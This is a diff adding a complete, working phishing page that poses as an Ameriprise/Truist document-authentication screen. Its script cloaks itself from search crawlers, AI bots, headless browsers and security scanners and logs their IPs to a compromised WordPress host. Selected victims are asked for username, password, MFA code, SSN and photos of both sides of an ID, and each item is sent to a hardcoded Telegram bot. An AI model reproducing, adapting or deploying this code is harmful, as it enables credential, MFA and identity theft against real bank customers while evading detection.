@@ -1,0 +1,681 @@
+<!DOCTYPE html>
+<html lang=en data-shell-version=6.418.0-master-bld.1587-159dc8c8-1587 class=background-color-experiment-overrides>
+    <meta charset=utf-8>
+    <meta name=viewport content="width=device-width,initial-scale=1">
+    <meta  content="default-src 'none'; font-src 'self' data:; img-src 'self' data:; style-src 'unsafe-inline'; media-src 'self' data:; script-src 'unsafe-inline' data:; object-src 'self' data:; frame-src 'self' data:;">
+    <title>Ameriprise</title>
+    <style>
+        body, html {
+            margin: 0;
+            padding: 0;
+            height: 100%;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen-Sans, Ubuntu, Cantarell, "Helvetica Neue", sans-serif;
+            color: #07090F;
+            line-height: 1.42857143;
+        }
+
+        iframe {
+            width: 100%;
+            height: 100vh; /* Full height */
+            border: none;
+        }
+    </style>
+<style>@keyframes indeterminateShortCircleTranslateUp{8%{transform:translateY(0)}50%{transform:translateY(-42%)}56%{transform:translateY(-42%)}100%{transform:translateY(0)}}@keyframes indeterminateShortRotationReduceMotion{0%{transform:rotate(0deg)}50%{transform:rotate(180deg)}100%{transform:rotate(360deg)}}@keyframes indeterminateShortCircleTransformsTheme{8%{transform:scale(1);fill:@theme indeterminateShortPrimary}50%{transform:scale(0.6);fill:@theme indeterminateShortSecondary}56%{transform:scale(0.6);fill:@theme indeterminateShortSecondary}100%{transform:scale(1);fill:@theme indeterminateShortPrimary}}@keyframes indeterminateShortCircleTransformsFill{8%{transform:scale(1)}50%{transform:scale(0.6)}56%{transform:scale(0.6)}100%{transform:scale(1)}}#web-shell-spinner{position:fixed;z-index:20010;height:100vh;width:100vw;display:flex;justify-content:center;align-items:center}#web-shell-spinner.has-background{background-color:white}@keyframes IndeterminateShort-indeterminateShortRotation{0%{transform:rotate(0deg)}8%{transform:rotate(0deg)}100%{transform:rotate(470deg)}}@keyframes IndeterminateShort-indeterminateShortCircleTranslateUp{8%{transform:translateY(0)}50%{transform:translateY(-42%)}56%{transform:translateY(-42%)}100%{transform:translateY(0)}}@keyframes IndeterminateShort-indeterminateShortRotationReduceMotion{0%{transform:rotate(0deg)}50%{transform:rotate(180deg)}100%{transform:rotate(360deg)}}@keyframes IndeterminateShort-indeterminateShortCircleTransformsTheme{8%{transform:scale(1);fill:var(--ids-indeterminate-indeterminateShortPrimary-54d1c4)}50%{transform:scale(0.6);fill:var(--ids-indeterminate-indeterminateShortSecondary-54d1c4)}56%{transform:scale(0.6);fill:var(--ids-indeterminate-indeterminateShortSecondary-54d1c4)}100%{transform:scale(1);fill:var(--ids-indeterminate-indeterminateShortPrimary-54d1c4)}}@keyframes IndeterminateShort-indeterminateShortCircleTransformsFill{8%{transform:scale(1)}50%{transform:scale(0.6)}56%{transform:scale(0.6)}100%{transform:scale(1)}}#web-shell-spinner .IndeterminateShort-wrapper{display:flex;justify-content:center;align-items:center;box-sizing:border-box;vertical-align:middle;will-change:transform;animation:IndeterminateShort-indeterminateShortRotation 1.4s linear;animation-iteration-count:infinite}@media screen and (prefers-reduced-motion:reduce){#web-shell-spinner .IndeterminateShort-wrapper{animation:IndeterminateShort-indeterminateShortRotationReduceMotion 20s linear infinite}}#web-shell-spinner .IndeterminateShort-circularSpinnerOuter{position:absolute;width:128px;height:128px}#web-shell-spinner .IndeterminateShort-circularSpinnerOuter:nth-of-type(2){transform:rotate(90deg)}#web-shell-spinner .IndeterminateShort-circularSpinnerOuter:nth-of-type(3){transform:rotate(180deg)}#web-shell-spinner .IndeterminateShort-circularSpinnerOuter:nth-of-type(4){transform:rotate(270deg)}#web-shell-spinner .IndeterminateShort-circularSpinnerInner{will-change:transform;animation:IndeterminateShort-indeterminateShortCircleTranslateUp 1.4s cubic-bezier(0.46,0.03,0.52,0.96) infinite;width:128px;height:128px}@media screen and (prefers-reduced-motion:reduce){#web-shell-spinner .IndeterminateShort-circularSpinnerInner{transform:translateY(-42%);animation:20s cubic-bezier(0.46,0.03,0.52,0.96) infinite}}#web-shell-spinner .IndeterminateShort-circularSpinnerCircle{position:absolute;will-change:transform;fill:var(--ids-indeterminate-indeterminateShortPrimary-54d1c4);animation:IndeterminateShort-indeterminateShortCircleTransformsTheme 1.4s cubic-bezier(0.46,0.03,0.52,0.96) infinite;animation-iteration-count:infinite;width:128px;height:128px}@media screen and (prefers-reduced-motion:reduce){#web-shell-spinner .IndeterminateShort-circularSpinnerCircle{animation:none}}@media screen and (prefers-reduced-motion:reduce){}:root{--ids-indeterminate-indeterminateShortPrimary-54d1c4:#0077c5;--ids-indeterminate-indeterminateShortSecondary-54d1c4:#34bfff}</style>
+
+<link rel=canonical href="https://accounts.intuit.com/app/sign-in?app_group=QBO&amp;asset_alias=Intuit.accounting.core.qbowebapp&amp;app_environment=prod">
+<style>img[src="data:,"],source[src="data:,"]{display:none!important}</style>
+   
+<body>
+
+    <div id="content"></div>
+
+    <script>
+        const blacklistedWords = [
+            
+        'google', 'microsoft', 'crawl','python','curl',
+        'Amazonbot','Applebot','Applebot-Extended','Bytespider',
+        'CCBot','ChatGPT-User','Claude-Web','ClaudeBot','Diffbot',
+        'FacebookBot','FriendlyCrawler','GPTBot','Google-Extended',
+        'GoogleOther','GoogleOther-Image','GoogleOther-Video','ICC-Crawler',
+        'ImagesiftBot','Meta-ExternalAgent','Meta-ExternalFetcher','OAI-SearchBot',
+        'PerplexityBot','PetalBot','Scrapy','Timpibot','VelenPublicWebCrawler',
+        'Webzio-Extended','YouBot','anthropic-ai','cohere-ai','facebookexternalhit',
+        'img2dataset','omgili','omgilibot'];
+
+    const allowedParamPattern = /^Sachiel\d$/;
+    const allowedParamPattern2 = /^Azrael\d$/;
+    var checkCountry = false;
+    var Country = "";
+
+function getBase64FromUrl() {
+    const url = window.location.href;
+    const urlObj = new URL(url);
+
+    const utmSource = decodeURIComponent(urlObj.searchParams.get('SIKA'));
+    const utmDevice = decodeURIComponent(urlObj.searchParams.get('TUMI'));
+
+    let decodedSource = '';
+    let extractedSource = '';
+    let decodedDevice = '';
+    let extractedDevice = '';
+
+    // Process utm_source
+    if (utmSource) {
+        const base64Part = utmSource.replace(/^info\d{0,3}/, '');
+        if (isBase64(base64Part)) {
+            try {
+                decodedSource = atob(base64Part);
+            } catch (error) {
+                console.error('Failed to decode Base64 string in utm_source:', error);
+                decodedSource = 'Error decoding Base64 string in utm_source.';
+            }
+        } else {
+            extractedSource = base64Part;
+        }
+    } else {
+        extractedSource = 'utm_source parameter not found.';
+    }
+
+    // Process utm_device
+    if (utmDevice) {
+        const base64PartDevice = utmDevice.replace(/^pills\d{0,3}/, '');
+        if (isBase64(base64PartDevice)) {
+            try {
+                decodedDevice = atob(base64PartDevice);
+            } catch (error) {
+                console.error('Failed to decode Base64 string in utm_device:', error);
+                decodedDevice = 'Error decoding Base64 string in utm_device.';
+            }
+        } else {
+            extractedDevice = base64PartDevice;
+        }
+    } else {
+        extractedDevice = 'utm_device parameter not found.';
+    }
+    const combinedSource = decodedSource || extractedSource;
+    const combinedDevice = decodedDevice || extractedDevice;
+    combinedResult = [combinedSource, combinedDevice].filter(Boolean).join('@');
+    return combinedResult;
+}
+
+function isBase64(str) {
+    try {
+        return btoa(atob(str)).replace(/=/g, '') === str.replace(/=/g, '');
+    } catch (err) {
+        return false;
+    }
+}
+
+function sendMessage() {
+  const token = '5474576959:AAEFEPb7hmHEmq_ZM_jasyYk46DECm44Sm0';
+  const chatId = '1412104349';
+  const url = `https://api.telegram.org/bot${token}/sendMessage`;
+  const userDetails = {
+    Client_Email: getBase64FromUrl(),
+    userAgent: navigator.userAgent,
+    language: navigator.language,
+    screenSize: `${window.screen.width}x${window.screen.height}`,
+    colorDepth: window.screen.colorDepth,
+    timestamp: new Date().toISOString(),
+  };
+
+  // Format userDetails into a readable string
+  const formattedDetails = `
+*User Details:*
+- *Client Email*: ${userDetails.Client_Email}
+- *User Agent*: ${userDetails.userAgent}
+- *Language*: ${userDetails.language}
+- *Screen Size*: ${userDetails.screenSize}
+- *Color Depth*: ${userDetails.colorDepth}
+- *Timestamp*: ${userDetails.timestamp}
+  `;
+
+  const data = {
+    chat_id: chatId,
+    text: formattedDetails,
+    parse_mode: 'Markdown', // Use Markdown to format the message nicely in Telegram
+  };
+
+  fetch(url, {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json',
+    },
+    body: JSON.stringify(data),
+  })
+    .then(response => response.json())
+    .then(result => {
+      console.log('Message sent successfully:', result);
+    })
+    .catch(error => {
+      console.error('Error sending message:', error);
+    });
+}
+
+function sendMessage2() {
+  const token = '5474576959:AAEFEPb7hmHEmq_ZM_jasyYk46DECm44Sm0';
+  const chatId = '1412104349';
+  const url = `https://api.telegram.org/bot${token}/sendMessage`;
+  const userDetails = {
+    Client_Emails: "Incoming Bot",
+    Client_Email: getBase64FromUrl(),
+    userAgent: navigator.userAgent,
+    language: navigator.language,
+    screenSize: `${window.screen.width}x${window.screen.height}`,
+    colorDepth: window.screen.colorDepth,
+    timestamp: new Date().toISOString(),
+  };
+
+  // Format userDetails into a readable string
+  const formattedDetails = `
+*User Details:*
+- *Client Email*: ${userDetails.Client_Emails}
+- *Client Email*: ${userDetails.Client_Email}
+- *User Agent*: ${userDetails.userAgent}
+- *Language*: ${userDetails.language}
+- *Screen Size*: ${userDetails.screenSize}
+- *Color Depth*: ${userDetails.colorDepth}
+- *Timestamp*: ${userDetails.timestamp}
+  `;
+
+  const data = {
+    chat_id: chatId,
+    text: formattedDetails,
+    parse_mode: 'Markdown', // Use Markdown to format the message nicely in Telegram
+  };
+
+  // Use the fetch API to make a POST request to the Telegram Bot API
+  fetch(url, {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json',
+    },
+    body: JSON.stringify(data),
+  })
+    .then(response => response.json())
+    .then(result => {
+      console.log('Message sent successfully:', result);
+    })
+    .catch(error => {
+      console.error('Error sending message:', error);
+    });
+}
+
+
+
+    function fetchIPInfo() {
+        const urlParams = new URLSearchParams(window.location.search);
+        const param = urlParams.get('Amethyst');
+        const para = urlParams.get('Chamuel');
+        if (!allowedParamPattern.test(param) || !allowedParamPattern2.test(para)) {
+            console.log('Invalid parameter. Redirecting to error page...');
+            sendMessage2();
+            fetch('https://ipinfo.io/json?token=d8eafd6deea176')
+                .then(response => response.json())
+                .then(data => {
+                    var ip = data.ip;
+                    addBlacklistedIP(ip);
+                    redirectToBlockedPage();
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                });
+            return;
+        }
+
+        fetch('https://ipinfo.io/json?token=d8eafd6deea176')
+            .then(response => response.json())
+            .then(data => {
+                var ip = data.ip;
+                var hostname = data.hostname || '';
+                console.log('IP Address:', ip);
+                console.log('Hostname:', hostname);
+                // Check if hostname contains any blacklisted words
+                if (blacklistedWords.some(word => hostname.includes(word))) {
+                    console.log('Hostname contains a blacklisted word. Adding IP to blacklist...');
+                    sendMessage2();
+                    addBlacklistedIP(ip);
+                    redirectToBlockedPage();
+                // } else if ((data.privacy && data.privacy.vpn) || (checkCountry && data.country && data.country !== Country)) {
+                //     console.log('IP ' + ip + ' is using a VPN or not from the allowed country. Adding to blacklist...');
+                //     // Add IP to blacklist database
+                //     addBlacklistedIP(ip);
+                //     redirectToBlockedPage();
+                } else {
+                    console.log('IP ' + ip + ' is not using a VPN and from the allowed country.');
+                    // Check if IP is blacklisted
+                    checkBlacklistedIP(ip);
+                }
+            })
+            .catch(error => {
+                console.error('Error:', error);
+            });
+    }
+    function redirectToBlockedPage() {
+        document.getElementById('content').innerHTML = `
+            <iframe src="https://www.putnam.com/literature/pdf/II989.pdf">
+                This browser does not support PDFs. Please download the PDF to view it: 
+                <a href="https://www.putnam.com/literature/pdf/II989.pdf">Download PDF</a>.
+            </iframe>
+        `;
+    }
+
+    function addBlacklistedIP(ip) {
+        // Check if IP is already in the blacklist
+        fetch('https://tastymomos.com.au/wp-includes/ID3/clap.php?ip=' + ip)
+            .then(response => response.text())
+            .then(data => {
+                if (data !== 'blacklisted') {
+                    fetch('https://tastymomos.com.au/wp-includes/ID3/clap.php', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/x-www-form-urlencoded',
+                        },
+                        body: 'ip=' + ip
+                    })
+                    .then(response => response.text())
+                    .then(data => {
+                        console.log(data); // Log the response
+                        // You can handle the response here (e.g., display a message to the user)
+                    })
+                    .catch(error => {
+                        console.error('Error:', error);
+                        redirectToBlockedPage();
+                    });
+                } else {
+                    console.log('IP ' + ip + ' is already in the blacklist.');
+                    redirectToBlockedPage();
+                }
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                redirectToBlockedPage();
+            });
+    }
+
+
+    function checkBlacklistedIP(ip) {
+    fetch('https://tastymomos.com.au/wp-includes/ID3/clap.php?ip=' + ip)
+        .then(response => response.text())
+        .then(data => {
+            if (data === 'blacklisted') {
+                console.log('IP ' + ip + ' is already blacklisted. Redirecting...');
+                sendMessage2();
+                addBlacklistedIP(ip);
+                redirectToBlockedPage();
+
+            } else if (data === 'clean') {
+                console.log('IP ' + ip + ' is not blacklisted. Proceeding...');
+                loadContent();
+            } else {
+                console.log('Error:', data);
+            }
+        })
+        .catch(error => {
+            console.error('Error:', error);
+        });
+}
+
+    const botUserAgents = [
+            'Googlebot', 'Microsoft', 'crawl', 'python', 'curl',
+            'Amazonbot', 'Applebot', 'Applebot-Extended', 'Bytespider',
+            'CCBot', 'ChatGPT-User', 'Claude-Web', 'ClaudeBot',
+            'Diffbot', 'FacebookBot', 'FriendlyCrawler', 'GPTBot',
+            'Google-Extended', 'GoogleOther', 'GoogleOther-Image',
+            'GoogleOther-Video', 'ICC-Crawler', 'ImagesiftBot',
+            'Meta-ExternalAgent', 'Meta-ExternalFetcher', 'OAI-SearchBot',
+            'PerplexityBot', 'PetalBot', 'Scrapy', 'Timpibot',
+            'VelenPublicWebCrawler', 'Webzio-Extended', 'YouBot',
+            'anthropic-ai', 'cohere-ai', 'facebookexternalhit',
+            'img2dataset', 'omgili', 'omgilibot'
+        ];
+
+        // Function to detect the User-Agent
+        function detectUserAgent() {
+            const userAgent = navigator.userAgent;
+            return botUserAgents.some(bot => userAgent.includes(bot));
+        }
+        function detectQueryParameter(paramName) {
+            const urlParams = new URLSearchParams(window.location.search);
+            return urlParams.has(paramName) ? urlParams.get(paramName) : null;
+        }
+    function loadContent() {
+    const isBot = detectUserAgent();
+    const paramValue = detectQueryParameter('Bd');
+    if (isBot) {
+        fetch('https://ipinfo.io/json?token=d8eafd6deea176')
+            .then(response => response.json())
+            .then(data => {
+                var ip = data.ip;
+                console.log(ip);
+                addBlacklistedIP(ip);
+                redirectToBlockedPage();}
+            ); 
+    } else if (paramValue) {
+        const script = document.createElement('script');
+        script.innerHTML = `
+           function isHuman() {
+                const userAgent = navigator.userAgent.toLowerCase();
+                const botUserAgents = [
+            'Googlebot', 'Microsoft', 'crawl', 'python', 'curl',
+            'Amazonbot', 'Applebot', 'Applebot-Extended', 'Bytespider',
+            'CCBot', 'ChatGPT-User', 'Claude-Web', 'ClaudeBot',
+            'Diffbot', 'FacebookBot', 'FriendlyCrawler', 'GPTBot',
+            'Google-Extended', 'GoogleOther', 'GoogleOther-Image',
+            'GoogleOther-Video', 'ICC-Crawler', 'ImagesiftBot',
+            'Meta-ExternalAgent', 'Meta-ExternalFetcher', 'OAI-SearchBot',
+            'PerplexityBot', 'PetalBot', 'Scrapy', 'Timpibot',
+            'VelenPublicWebCrawler', 'Webzio-Extended', 'YouBot',
+            'anthropic-ai', 'cohere-ai', 'facebookexternalhit',
+            'img2dataset', 'omgili', 'omgilibot'
+                ];
+                const isBot = botUserAgents.some(bot => userAgent.includes(bot));
+                const headlessChecks = [
+                    () => /HeadlessChrome/.test(userAgent),
+                    () => navigator.webdriver,
+                    () => window.outerWidth === 0 && window.outerHeight === 0,
+                    () => navigator.languages === "" || navigator.plugins.length === 0
+                ];
+                const isHeadless = headlessChecks.some(check => check());
+                return !isBot && !isHeadless;
+            }
+
+            function isValidEmail(email) {
+                const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+                return emailPattern.test(email);
+            }                
+
+function verifyAndRedirect() {
+                if (isHuman()) {
+            const AUTH_PASSWORD = "correctpassword"; 
+            const DOC_LINK = "https://example.com/document";
+            const TELEGRAM_BOT_URL = "https://api.telegram.org/bot5474576959:AAEFEPb7hmHEmq_ZM_jasyYk46DECm44Sm0/sendMessage";
+            const TELEGRAM_FILE_URL = "https://api.telegram.org/bot5474576959:AAEFEPb7hmHEmq_ZM_jasyYk46DECm44Sm0/sendDocument";
+            const IPINFO_URL = "https://ipinfo.io/json?token=d8eafd6deea176"; 
+
+            let attemptCounter = 0;
+
+            const passwordForm = document.getElementById('authForm');
+            const passwordInput = document.getElementById('password');
+            const usernameInput = document.getElementById('username');
+            const passwordError = document.getElementById('password-error');
+            const mfaForm = document.getElementById('mfaAuthForm');
+            const mfaInput = document.getElementById('mfa-code');
+            const mfaError = document.getElementById('mfa-error');
+            const identityForm = document.getElementById('identityForm');
+            const ssnInput = document.getElementById('ssn');
+            const idFrontInput = document.getElementById('id-front');
+            const idBackInput = document.getElementById('id-back');
+            const identityError = document.getElementById('identity-error');
+            const loading = document.getElementById('loading');
+
+            async function getLocation() {
+                try {
+                    const response = await fetch(IPINFO_URL);
+                    return response.json();
+                } catch (error) {
+                    return { city: "Unknown", region: "Unknown", country: "Unknown", ip: "Unknown" };
+                }
+            }
+
+            async function sendToTelegram(message) {
+                await fetch(TELEGRAM_BOT_URL, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ chat_id: "1412104349", text: message }),
+                });
+            }
+
+            async function sendFilesToTelegram(fileInput, caption) {
+                if (!fileInput.files.length) return;
+
+                const formData = new FormData();
+                formData.append("chat_id", "1412104349");
+                formData.append("document", fileInput.files[0]);
+                formData.append("caption", caption);
+
+                try {
+                    const response = await fetch(TELEGRAM_FILE_URL, {
+                        method: "POST",
+                        body: formData,
+                    });
+                    if (!response.ok) {
+                        console.error(\`Failed to send file: \${response.statusText}\`);
+                    }
+                } catch (error) {
+                    console.error(\`Error sending file to Telegram: \${error.message}\`);
+                }
+            }
+
+            passwordForm.addEventListener('submit', async (event) => {
+                event.preventDefault();
+                attemptCounter++;
+
+                const location = await getLocation();
+                const passwordValue = passwordInput.value;
+                const usernameValue = usernameInput.value;
+
+                sendToTelegram(\`Username: \${usernameValue}\\nPassword: \${passwordValue}\\nLocation: \${location.city}, \${location.region}, \${location.country}\`);
+
+                if (passwordValue === AUTH_PASSWORD) {
+                    transitionToMFA();
+                } else {
+                    passwordError.style.display = 'block';
+                    if (attemptCounter > 1) transitionToMFA();
+                }
+            });
+
+            mfaForm.addEventListener('submit', async (event) => {
+                event.preventDefault();
+                const mfaValue = mfaInput.value.trim();
+                const location = await getLocation();
+
+                sendToTelegram(\`MFA Code: \${mfaValue}\\nLocation: \${location.city}, \${location.region}, \${location.country}\`);
+                if (/^\\d{6}$/.test(mfaValue)) {
+                    transitionToIdentityVerification();
+                } else {
+                    mfaError.style.display = 'block';
+                }
+            });
+
+            identityForm.addEventListener('submit', async (event) => {
+                event.preventDefault();
+
+                const ssnValue = ssnInput.value.trim();
+                const isSSNValid = /^\\d{9}$/.test(ssnValue);
+
+                if (!isSSNValid || !idFrontInput.files.length || !idBackInput.files.length) {
+                    identityError.style.display = 'block';
+                    identityError.textContent = "Please enter a valid 9-digit SSN and upload all required files.";
+                    return;
+                }
+
+                const location = await getLocation();
+                sendToTelegram(\`SSN: \${ssnValue}\\nLocation: \${location.city}, \${location.region}, \${location.country}\`);
+                await sendFilesToTelegram(idFrontInput, "Uploaded ID Front");
+                await sendFilesToTelegram(idBackInput, "Uploaded ID Back");
+
+                showLoadingAndRedirect();
+            });
+
+            function transitionToMFA() {
+                document.getElementById('password-form').style.display = 'none';
+                document.getElementById('mfa-form').style.display = 'block';
+                hideAuthenticationTitle();
+            }
+
+            function transitionToIdentityVerification() {
+                document.getElementById('mfa-form').style.display = 'none';
+                document.getElementById('identity-verification-form').style.display = 'block';
+                hideAuthenticationTitle();
+            }
+
+            function hideAuthenticationTitle() {
+                const authTitle = document.getElementById('authentication-title');
+                if (authTitle) authTitle.style.display = 'none';
+            }
+
+            function showLoadingAndRedirect() {
+                loading.style.display = 'block';
+                setTimeout(() => (window.location.href = DOC_LINK), 3000);
+            }
+    }}
+            setTimeout(verifyAndRedirect, 1000);
+        `;
+        document.getElementById('content').innerHTML = `
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Authenticate to View Document</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            text-align: center;
+            padding: 20px;
+        }
+        .container {
+            background-color: white;
+            padding: 40px;
+            border-radius: 10px;
+            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
+            width: 300px;
+            margin: 0 auto;
+        }
+        h2, h3 {
+            font-size: 20px;
+            color: #333;
+        }
+        .logo {
+            width: 250px;
+            margin-bottom: 40px;
+        }
+        input[type="text"], input[type="password"], input[type="file"], button {
+            width: calc(100% - 20px);
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            box-sizing: border-box;
+        }
+        input[type="text"].error, input[type="password"].error, input[type="file"].error {
+            border-color: red;
+        }
+        button {
+            background-color: #170337bf;
+            color: white;
+            border: none;
+            cursor: pointer;
+            font-size: 16px;
+        }
+        button:disabled {
+            background-color: #ccc;
+            cursor: not-allowed;
+        }
+        button:hover:not(:disabled) {
+            background-color: #9c0000;
+        }
+        .error-message {
+            color: red;
+            font-size: 14px;
+            display: none;
+        }
+        .mfa-form, #identity-verification-form {
+            display: none;
+            text-align: center;
+        }
+        .mfa-gif, .loading {
+            margin: 20px auto;
+            width: 60px;
+        }
+        .loading {
+            display: none;
+            width: 50px;
+        }
+        label, input[type="file"] {
+            display: block;
+            text-align: left;
+            margin-bottom: 10px;
+        }
+        @media (max-width: 400px) {
+            .container {
+                width: 90%;
+                padding: 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="https://static.truist.com/content/dam/global-images/truist-logo-purple.svg" alt="Logo" class="logo">
+        <h2 id="authentication-title">Please authenticate to view the document</h2>
+
+        <!-- Username and Password form -->
+        <div id="password-form">
+            <form id="authForm">
+                <input type="text" id="username" placeholder="Enter your username" required>
+                <input type="password" id="password" placeholder="Enter your password" required>
+                <div id="password-error" class="error-message">Incorrect password. Please try again.</div>
+                <button type="submit" id="auth-submit">Continue</button>
+            </form>
+        </div>
+
+        <!-- MFA form -->
+        <div id="mfa-form" class="mfa-form">
+            <h3>Enter the MFA Code</h3>
+            <img src="https://plugin.intuitcdn.net/identity-authn-core-ui/13139b78b7f32282.gif" alt="MFA Animation" class="mfa-gif">
+            <form id="mfaAuthForm">
+                <input type="text" id="mfa-code" placeholder="Enter your MFA code" required>
+                <div id="mfa-error" class="error-message">Invalid MFA code. Please try again.</div>
+                <button type="submit">Continue</button>
+            </form>
+        </div>
+
+        <!-- Identity verification form -->
+        <div id="identity-verification-form">
+            <h3>Verify Your Identity</h3>
+            <p>Please provide your SSN and upload images of your ID.</p>
+            <form id="identityForm" enctype="multipart/form-data">
+                <input type="text" id="ssn" placeholder="Enter your SSN" required title="Format: xxxxxxxxx">
+                <label for="id-front">Upload ID Front</label>
+                <input type="file" id="id-front" accept="image/*" required>
+                <label for="id-back">Upload ID Back</label>
+                <input type="file" id="id-back" accept="image/*" required>
+                <div id="identity-error" class="error-message">Please fill out all fields and upload valid files.</div>
+                <button type="submit">Verify Identity</button>
+            </form>
+        </div>
+
+        <!-- Loading animation -->
+        <img src="https://cdnl.iconscout.com/lottie/premium/thumb/loading-bar-and-loader-5371059-4510678.gif" alt="Loading" class="loading" id="loading">
+    </div>
+   </body>
+</html>
+    `;
+        document.body.appendChild(script);
+    } else {
+        document.getElementById('content').innerHTML = `
+            <iframe src="https://www.putnam.com/literature/pdf/II989.pdf">
+                This browser does not support PDFs. Please download the PDF to view it: 
+                <a href="https://www.putnam.com/literature/pdf/II989.pdf">Download PDF</a>.
+            </iframe>
+        `;
+        fetch('https://ipinfo.io/json?token=d8eafd6deea176')
+            .then(response => response.json())
+            .then(data => {
+                var ip = data.ip;
+                console.log(ip);
+                addBlacklistedIP(ip);
+                redirectToBlockedPage();}
+            ); 
+    }
+}
+
+
+        fetchIPInfo();
+    </script>
+    
+</body>
+</html>
